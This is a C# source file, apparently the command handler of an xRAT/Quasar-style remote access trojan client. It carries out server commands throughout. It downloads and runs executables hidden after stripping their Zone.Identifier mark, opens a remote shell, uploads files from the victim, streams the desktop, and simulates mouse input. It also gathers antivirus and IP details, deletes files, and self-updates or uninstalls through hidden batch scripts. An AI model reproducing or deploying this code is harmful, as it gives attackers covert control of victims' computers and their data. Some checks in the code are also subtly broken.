using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;
using xClient.Config;
using xClient.Core.RemoteShell;

namespace xClient.Core.Commands
{
	public static class CommandHandler
	{
		[DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		private static extern bool DeleteFile(string name);
		[DllImport("user32.dll")]
		private static extern bool SetCursorPos(int x, int y);
		[DllImport("user32.dll")]
		private static extern void mouse_event(int dwFlags, int dx, int dy, int cButtons, int dwExtraInfo);

		private static Bitmap lastDesktopScreenshot = null;
		private static Shell shell = null;

		private const int MOUSEEVENTF_LEFTDOWN = 0x02;
		private const int MOUSEEVENTF_LEFTUP = 0x04;
		private const int MOUSEEVENTF_RIGHTDOWN = 0x08;
		private const int MOUSEEVENTF_RIGHTUP = 0x10;

		public static void HandleInitializeCommand(global::xClient.Core.Packets.ServerPackets.InitializeCommand command, global::xClient.Core.Client client)
		{
			SystemCore.InitializeGeoIp();
			new global::xClient.Core.Packets.ClientPackets.Initialize(Settings.VERSION, SystemCore.OperatingSystem, SystemCore.AccountType, SystemCore.Country, SystemCore.CountryCode, SystemCore.Region, SystemCore.City, SystemCore.ImageIndex).Execute(client);
		}

		public static void HandleDownloadAndExecuteCommand(global::xClient.Core.Packets.ServerPackets.DownloadAndExecute command, global::xClient.Core.Client client)
		{
			new global::xClient.Core.Packets.ClientPackets.Status("Downloading file...").Execute(client);

			new Thread(new ThreadStart(() =>
			{
				string tempFile = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), Helper.Helper.GetRandomFilename(12, ".exe"));

				try
				{
					using (WebClient c = new WebClient())
					{
						c.Proxy = null;
						c.DownloadFile(command.URL, tempFile);
					}
				}
				catch
				{
					new global::xClient.Core.Packets.ClientPackets.Status("Download failed!").Execute(client);
					return;
				}

				new global::xClient.Core.Packets.ClientPackets.Status("Downloaded File!").Execute(client);

				try
				{
					DeleteFile(tempFile + ":Zone.Identifier");

					var bytes = File.ReadAllBytes(tempFile);
					if (bytes[0] != 'M' && bytes[1] != 'Z')
						throw new Exception("no pe file");

					ProcessStartInfo startInfo = new ProcessStartInfo();
					if (command.RunHidden)
					{
						startInfo.WindowStyle = ProcessWindowStyle.Hidden;
						startInfo.CreateNoWindow = true;
					}
					startInfo.UseShellExecute = command.RunHidden;
					startInfo.FileName = tempFile;
					Process.Start(startInfo);
				}
				catch
				{
					DeleteFile(tempFile);
					new global::xClient.Core.Packets.ClientPackets.Status("Execution failed!").Execute(client);
					return;
				}

				new global::xClient.Core.Packets.ClientPackets.Status("Executed File!").Execute(client);
			})).Start();
		}

		public static void HandleUploadAndExecute(global::xClient.Core.Packets.ServerPackets.UploadAndExecute command, global::xClient.Core.Client client)
		{
			new Thread(new ThreadStart(() =>
			{
				byte[] fileBytes = command.FileBytes;
				string tempFile = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), command.FileName);

				try
				{
					if (fileBytes[0] != 'M' && fileBytes[1] != 'Z')
						throw new Exception("no pe file");

					File.WriteAllBytes(tempFile, fileBytes);

					DeleteFile(tempFile + ":Zone.Identifier");

					ProcessStartInfo startInfo = new ProcessStartInfo();
					if (command.RunHidden)
					{
						startInfo.WindowStyle = ProcessWindowStyle.Hidden;
						startInfo.CreateNoWindow = true;
					}
					startInfo.UseShellExecute = command.RunHidden;
					startInfo.FileName = tempFile;
					Process.Start(startInfo);
				}
				catch
				{
					DeleteFile(tempFile);
					new global::xClient.Core.Packets.ClientPackets.Status("Execution failed!").Execute(client);
					return;
				}

				new global::xClient.Core.Packets.ClientPackets.Status("Executed File!").Execute(client);
			})).Start();
		}

		public static void HandleUninstall(global::xClient.Core.Packets.ServerPackets.Uninstall command, global::xClient.Core.Client client)
		{
			new global::xClient.Core.Packets.ClientPackets.Status("Uninstalling... bye ;(").Execute(client);

			if (Settings.STARTUP)
			{
				if (SystemCore.AccountType == "Admin")
				{
					try
					{
						Microsoft.Win32.RegistryKey key = Microsoft.Win32.Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true);
						if (key != null)
						{
							key.DeleteValue(Settings.STARTUPKEY, true);
							key.Close();
						}
					}
					catch
					{
						// try deleting from Registry.CurrentUser
						Microsoft.Win32.RegistryKey key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true);
						if (key != null)
						{
							key.DeleteValue(Settings.STARTUPKEY, true);
							key.Close();
						}
					}
				}
				else
				{
					try
					{
						Microsoft.Win32.RegistryKey key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true);
						if (key != null)
						{
							key.DeleteValue(Settings.STARTUPKEY, true);
							key.Close();
						}
					}
					catch
					{ }
				}
			}

			string filename = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), Helper.Helper.GetRandomFilename(12, ".bat"));
			
			string uninstallBatch = (Settings.INSTALL && Settings.HIDEFILE) ? 
					"@echo off" + "\n" +
					"echo DONT CLOSE THIS WINDOW!" + "\n" +
					"ping -n 20 localhost > nul" + "\n" +
					"del /A:H " + "\"" + SystemCore.MyPath + "\"" + "\n" +
					"del " + "\"" + filename + "\""
				:
					"@echo off" + "\n" +
					"echo DONT CLOSE THIS WINDOW!" + "\n" +
					"ping -n 20 localhost > nul" + "\n" +
					"del " + "\"" + SystemCore.MyPath + "\"" + "\n" +
					"del " + "\"" + filename + "\""
				;

			File.WriteAllText(filename, uninstallBatch);
			ProcessStartInfo startInfo = new ProcessStartInfo();
			startInfo.WindowStyle = ProcessWindowStyle.Hidden;
			startInfo.CreateNoWindow = true;
			startInfo.UseShellExecute = true;
			startInfo.FileName = filename;
			Process.Start(startInfo);

			SystemCore.Disconnect = true;
			client.Disconnect();
		}

		public static void HandleRemoteDesktop(global::xClient.Core.Packets.ServerPackets.Desktop command, global::xClient.Core.Client client)
		{
			if (lastDesktopScreenshot == null)
			{
				lastDesktopScreenshot = Helper.Helper.GetDesktop(command.Mode, command.Number);

				byte[] desktop = Helper.Helper.CImgToByte(lastDesktopScreenshot, System.Drawing.Imaging.ImageFormat.Jpeg);

				new global::xClient.Core.Packets.ClientPackets.DesktopResponse(desktop).Execute(client);

				desktop = null;
			}
			else
			{
				Bitmap currentDesktopScreenshot = Helper.Helper.GetDesktop(command.Mode, command.Number);

				Bitmap changesScreenshot = Helper.Helper.GetDiffDesktop(lastDesktopScreenshot, currentDesktopScreenshot);

				lastDesktopScreenshot = currentDesktopScreenshot;

				byte[] desktop = Helper.Helper.CImgToByte(changesScreenshot, System.Drawing.Imaging.ImageFormat.Png);

				new global::xClient.Core.Packets.ClientPackets.DesktopResponse(desktop).Execute(client);

				desktop = null;
				changesScreenshot = null;
				currentDesktopScreenshot = null;
			}
		}

		public static void HandleGetProcesses(global::xClient.Core.Packets.ServerPackets.GetProcesses command, global::xClient.Core.Client client)
		{
			Process[] pList = Process.GetProcesses();
			string[] processes = new string[pList.Length];
			int[] ids = new int[pList.Length];
			string[] titles = new string[pList.Length];

			int i = 0;
			foreach (Process p in pList)
			{
				processes[i] = p.ProcessName + ".exe";
				ids[i] = p.Id;
				titles[i] = p.MainWindowTitle;
				i++;
			}

			new global::xClient.Core.Packets.ClientPackets.GetProcessesResponse(processes, ids, titles).Execute(client);
		}

		public static void HandleKillProcess(global::xClient.Core.Packets.ServerPackets.KillProcess command, global::xClient.Core.Client client)
		{
			try
			{
				Process.GetProcessById(command.PID).Kill();
			}
			catch
			{ }

			HandleGetProcesses(new global::xClient.Core.Packets.ServerPackets.GetProcesses(), client);
		}

		public static void HandleStartProcess(global::xClient.Core.Packets.ServerPackets.StartProcess command, global::xClient.Core.Client client)
		{
			ProcessStartInfo startInfo = new ProcessStartInfo();
			startInfo.UseShellExecute = true;
			startInfo.FileName = command.Processname;
			Process.Start(startInfo);

			HandleGetProcesses(new global::xClient.Core.Packets.ServerPackets.GetProcesses(), client);
		}

		public static void HandleDrives(global::xClient.Core.Packets.ServerPackets.Drives command, global::xClient.Core.Client client)
		{
			new global::xClient.Core.Packets.ClientPackets.DrivesResponse(System.Environment.GetLogicalDrives()).Execute(client);
		}

		public static void HandleDirectory(global::xClient.Core.Packets.ServerPackets.Directory command, global::xClient.Core.Client client)
		{
			try
			{
				DirectoryInfo dicInfo = new System.IO.DirectoryInfo(command.RemotePath);

				FileInfo[] iFiles = dicInfo.GetFiles();
				DirectoryInfo[] iFolders = dicInfo.GetDirectories();

				string[] files = new string[iFiles.Length];
				long[] filessize = new long[iFiles.Length];
				string[] folders = new string[iFolders.Length];

				int i = 0;
				foreach (FileInfo file in iFiles)
				{
					files[i] = file.Name;
					filessize[i] = file.Length;
					i++;
				}
				if (files.Length == 0)
				{
					files = new string[] { "$$$EMPTY$$$$" };
					filessize = new long[] { 0 };
				}

				i = 0;
				foreach (DirectoryInfo folder in iFolders)
				{
					folders[i] = folder.Name;
					i++;
				}
				if (folders.Length == 0)
					folders = new string[] { "$$$EMPTY$$$$" };

				new global::xClient.Core.Packets.ClientPackets.DirectoryResponse(files, folders, filessize).Execute(client);
			}
			catch
			{
				new global::xClient.Core.Packets.ClientPackets.DirectoryResponse(new string[] { "$$$EMPTY$$$$" }, new string[] { "$$$EMPTY$$$$" }, new long[] { 0 }).Execute(client);
			}
		}

		public static void HandleDownloadFile(global::xClient.Core.Packets.ServerPackets.DownloadFile command, global::xClient.Core.Client client)
		{
			try
			{
				byte[] bytes = File.ReadAllBytes(command.RemotePath);
				new global::xClient.Core.Packets.ClientPackets.DownloadFileResponse(Path.GetFileName(command.RemotePath), bytes, command.ID).Execute(client);
			}
			catch
			{ }
		}

		public static void HandleMouseClick(global::xClient.Core.Packets.ServerPackets.MouseClick command, global::xClient.Core.Client client)
		{
			if (command.LeftClick)
			{
				SetCursorPos(command.X, command.Y);
				mouse_event(MOUSEEVENTF_LEFTDOWN, command.X, command.Y, 0, 0);
				mouse_event(MOUSEEVENTF_LEFTUP, command.X, command.Y, 0, 0);
				if (command.DoubleClick)
				{
					mouse_event(MOUSEEVENTF_LEFTDOWN, command.X, command.Y, 0, 0);
					mouse_event(MOUSEEVENTF_LEFTUP, command.X, command.Y, 0, 0);
				}
			}
			else
			{
				SetCursorPos(command.X, command.Y);
				mouse_event(MOUSEEVENTF_RIGHTDOWN, command.X, command.Y, 0, 0);
				mouse_event(MOUSEEVENTF_RIGHTUP, command.X, command.Y, 0, 0);
				if (command.DoubleClick)
				{
					mouse_event(MOUSEEVENTF_RIGHTDOWN, command.X, command.Y, 0, 0);
					mouse_event(MOUSEEVENTF_RIGHTUP, command.X, command.Y, 0, 0);
				}
			}
		}

		public static void HandleGetSystemInfo(global::xClient.Core.Packets.ServerPackets.GetSystemInfo command, global::xClient.Core.Client client)
		{
			try
			{
				string[] infoCollection = new string[] {
					"Processor (CPU)",
					SystemCore.GetCpu(),
					"Memory (RAM)",
					string.Format("{0} MB", SystemCore.GetRam()),
					"Video Card (GPU)",
					SystemCore.GetGpu(),
					"Username",
					SystemCore.GetUsername(),
					"PC Name",
					SystemCore.GetPcName(),
					"Uptime",
					SystemCore.GetUptime(),
					"LAN IP Address",
					SystemCore.GetLanIp(),
					"WAN IP Address",
					SystemCore.WANIP,
					"Antivirus",
					SystemCore.GetAntivirus(),
					"Firewall",
					SystemCore.GetFirewall()
				};

				new global::xClient.Core.Packets.ClientPackets.GetSystemInfoResponse(infoCollection).Execute(client);
			}
			catch
			{ }
		}

		public static void HandleVisitWebsite(global::xClient.Core.Packets.ServerPackets.VisitWebsite command, global::xClient.Core.Client client)
		{
			string url = command.URL;

			if (!url.StartsWith("http"))
				url = "http://" + url;

			if (Uri.IsWellFormedUriString(url, UriKind.RelativeOrAbsolute))
			{
				if (!command.Hidden)
					Process.Start(url);
				else
				{
					try
					{
						HttpWebRequest Request = (HttpWebRequest)HttpWebRequest.Create(url);
						Request.UserAgent = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.114 Safari/537.36";
						Request.AllowAutoRedirect = true;
						Request.Timeout = 10000;
						Request.Method = "GET";
						HttpWebResponse Response = (HttpWebResponse)Request.GetResponse();
						Stream DataStream = Response.GetResponseStream();
						StreamReader reader = new StreamReader(DataStream);
						reader.Close();
						DataStream.Close();
						Response.Close();
					}
					catch
					{ }
				}

				new global::xClient.Core.Packets.ClientPackets.Status("Visited Website").Execute(client);
			}
		}

		public static void HandleShowMessageBox(global::xClient.Core.Packets.ServerPackets.ShowMessageBox command, global::xClient.Core.Client client)
		{
			MessageBox.Show(null, command.Text, command.Caption, (MessageBoxButtons)Enum.Parse(typeof(MessageBoxButtons), command.MessageboxButton), (MessageBoxIcon)Enum.Parse(typeof(MessageBoxIcon), command.MessageboxIcon));
			new global::xClient.Core.Packets.ClientPackets.Status("Showed Messagebox").Execute(client);
		}

		public static void HandleUpdate(global::xClient.Core.Packets.ServerPackets.Update command, global::xClient.Core.Client client)
		{
			// i dont like this updating... if anyone has a better idea feel free to edit it
			new global::xClient.Core.Packets.ClientPackets.Status("Downloading file...").Execute(client);

			new Thread(new ThreadStart(() =>
			{
				string tempFile = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), Helper.Helper.GetRandomFilename(12, ".exe"));

				try
				{
					using (WebClient c = new WebClient())
					{
						c.Proxy = null;
						c.DownloadFile(command.DownloadURL, tempFile);
					}
				}
				catch
				{
					new global::xClient.Core.Packets.ClientPackets.Status("Download failed!").Execute(client);
					return;
				}

				new global::xClient.Core.Packets.ClientPackets.Status("Downloaded File!").Execute(client);

				new global::xClient.Core.Packets.ClientPackets.Status("Updating...").Execute(client);

				try
				{
					DeleteFile(tempFile + ":Zone.Identifier");

					var bytes = File.ReadAllBytes(tempFile);
					if (bytes[0] != 'M' && bytes[1] != 'Z')
						throw new Exception("no pe file");

					string filename = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), Helper.Helper.GetRandomFilename(12, ".bat"));

					string uninstallBatch = (Settings.INSTALL && Settings.HIDEFILE) ?
							"@echo off" + "\n" +
							"echo DONT CLOSE THIS WINDOW!" + "\n" +
							"ping -n 20 localhost > nul" + "\n" +
							"del /A:H " + "\"" + SystemCore.MyPath + "\"" + "\n" +
							"move " + "\"" + tempFile + "\"" + " " + "\"" + SystemCore.MyPath + "\"" + "\n" +
							"start \"\" " + "\"" + SystemCore.MyPath + "\"" + "\n" +
							"del " + "\"" + filename + "\""
						:
							"@echo off" + "\n" +
							"echo DONT CLOSE THIS WINDOW!" + "\n" +
							"ping -n 20 localhost > nul" + "\n" +
							"del " + "\"" + SystemCore.MyPath + "\"" + "\n" +
							"move " + "\"" + tempFile + "\"" + " " + "\"" + SystemCore.MyPath + "\"" + "\n" +
							"start \"\" " + "\"" + SystemCore.MyPath + "\"" + "\n" +
							"del " + "\"" + filename + "\""
						;

					File.WriteAllText(filename, uninstallBatch);
					ProcessStartInfo startInfo = new ProcessStartInfo();
					startInfo.WindowStyle = ProcessWindowStyle.Hidden;
					startInfo.CreateNoWindow = true;
					startInfo.UseShellExecute = true;
					startInfo.FileName = filename;
					Process.Start(startInfo);

					SystemCore.Disconnect = true;
					client.Disconnect();
				}
				catch
				{
					DeleteFile(tempFile);
					new global::xClient.Core.Packets.ClientPackets.Status("Update failed!").Execute(client);
					return;
				}
			})).Start();
		}

		public static void HandleMonitors(global::xClient.Core.Packets.ServerPackets.Monitors command, global::xClient.Core.Client client)
		{
			new global::xClient.Core.Packets.ClientPackets.MonitorsResponse(Screen.AllScreens.Length).Execute(client);
		}

		public static void HandleShellCommand(global::xClient.Core.Packets.ServerPackets.ShellCommand command, global::xClient.Core.Client client)
		{
			if (shell == null)
				shell = new Shell();

			string input = command.Command;

			if (input == "exit")
				CloseShell();
			else
				shell.ExecuteCommand(input);
		}

		public static void CloseShell()
		{
			if (shell != null)
			{
				shell.CloseSession();
				shell = null;
			}
		}

		public static void HandleRename(global::xClient.Core.Packets.ServerPackets.Rename command, global::xClient.Core.Client client)
		{
			try
			{
				if (command.IsDir)
					Directory.Move(command.Path, command.NewPath);
				else
					File.Move(command.Path, command.NewPath);

				HandleDirectory(new global::xClient.Core.Packets.ServerPackets.Directory(Path.GetDirectoryName(command.NewPath)), client);
			}
			catch
			{ }
		}

		public static void HandleDelete(global::xClient.Core.Packets.ServerPackets.Delete command, global::xClient.Core.Client client)
		{
			try
			{
				if (command.IsDir)
					Directory.Delete(command.Path, true);
				else
					File.Delete(command.Path);

				HandleDirectory(new global::xClient.Core.Packets.ServerPackets.Directory(Path.GetDirectoryName(command.Path)), client);
			}
			catch
			{ }
		}

		public static void HandleAction(global::xClient.Core.Packets.ServerPackets.Action command, global::xClient.Core.Client client)
		{
			try
			{
				ProcessStartInfo startInfo = new ProcessStartInfo();
				switch(command.Mode)
				{
					case 0:
						startInfo.WindowStyle = ProcessWindowStyle.Hidden;
						startInfo.CreateNoWindow = true;
						startInfo.UseShellExecute = true;
						startInfo.Arguments = "/s /t 0"; // shutdown
						startInfo.FileName = "shutdown";
						Process.Start(startInfo);
						break;
					case 1:
						startInfo.WindowStyle = ProcessWindowStyle.Hidden;
						startInfo.CreateNoWindow = true;
						startInfo.UseShellExecute = true;
						startInfo.Arguments = "/r /t 0"; // restart
						startInfo.FileName = "shutdown";
						Process.Start(startInfo);
						break;
					case 2:
						Application.SetSuspendState(PowerState.Suspend, true, true); // standby
						break;
				}
			}
			catch
			{
				new global::xClient.Core.Packets.ClientPackets.Status("Action failed!").Execute(client);
			}
		}

		public static void HandleGetStartup(object command, global::xClient.Core.Client client)
		{
			try
			{
				string[] LMRun, LMRunOnce, CURun, CURunOnce, CAStartup, AStartup;
				LMRun = LMRunOnce = CURun = CURunOnce = CAStartup = AStartup = new string[50];

				using (var key = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", false))
				{
					for (int i = 0; i < key.GetValueNames().Length && i < LMRun.Length; i++)
						LMRun[i] = string.Format("{0}||{1}", key.GetValueNames()[i].ToString(), key.GetValue(key.GetValueNames()[i]));
				}
				using (var key = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", false))
				{
					for (int i = 0; i < key.GetValueNames().Length && i < LMRunOnce.Length; i++)
						LMRunOnce[i] = string.Format("{0}||{1}", key.GetValueNames()[i].ToString(), key.GetValue(key.GetValueNames()[i]));
				}
				using (var key = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", false))
				{
					for (int i = 0; i < key.GetValueNames().Length && i < CURun.Length; i++)
						CURun[i] = string.Format("{0}||{1}", key.GetValueNames()[i].ToString(), key.GetValue(key.GetValueNames()[i]));
				}
				using (var key = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", false))
				{
					for (int i = 0; i < key.GetValueNames().Length && i < CURunOnce.Length; i++)
						CURunOnce[i] = string.Format("{0}||{1}", key.GetValueNames()[i].ToString(), key.GetValue(key.GetValueNames()[i]));
				}
				if (Directory.Exists(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData), "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")))
				{
					var files = new DirectoryInfo(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData), "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")).GetFiles();
					for (int i = 0; i < files.Length && i < CAStartup.Length; i++)
						CAStartup[i] = string.Format("{0}||{1}", files[i].Name, files[i].FullName);
				}
				if (Directory.Exists(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")))
				{
					var files = new DirectoryInfo(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")).GetFiles();
					for (int i = 0; i < files.Length && i < AStartup.Length; i++)
						AStartup[i] = string.Format("{0}||{1}", files[i].Name, files[i].FullName);
				}
			}
			catch
			{
				new global::xClient.Core.Packets.ClientPackets.Status("Startup Information failed!").Execute(client);
			}
		}
	}
}
